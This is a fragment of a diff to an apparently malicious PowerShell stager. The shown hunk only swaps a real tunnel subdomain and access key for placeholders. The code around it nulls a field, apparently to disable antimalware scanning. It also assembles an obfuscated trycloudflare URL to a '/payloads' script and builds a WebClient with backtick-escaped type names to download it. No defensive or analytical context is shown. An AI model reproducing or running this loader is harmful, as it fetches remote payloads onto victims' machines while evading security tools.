@@ -5,9 +5,9 @@ if($f){$f.SetValue($null,[IntPtr]::Zero)}
 
 # Obfuscated URL construction
 $h="https://geometry-offered-guns-replies"
-$d=".trycloudflare.com"
+$d="CHANGE-ME.trycloudflare.com"
 $p="/payloads/i5_self.ps1"
-$k="?key=8ca60eebbe9a141869305ed9ab1a0050"
+$k="?key=PLACEHOLDER_TOKEN"
 
 # Use .NET WebClient with obfuscated method
 $wc=New-Object "Net`.Web`Client"
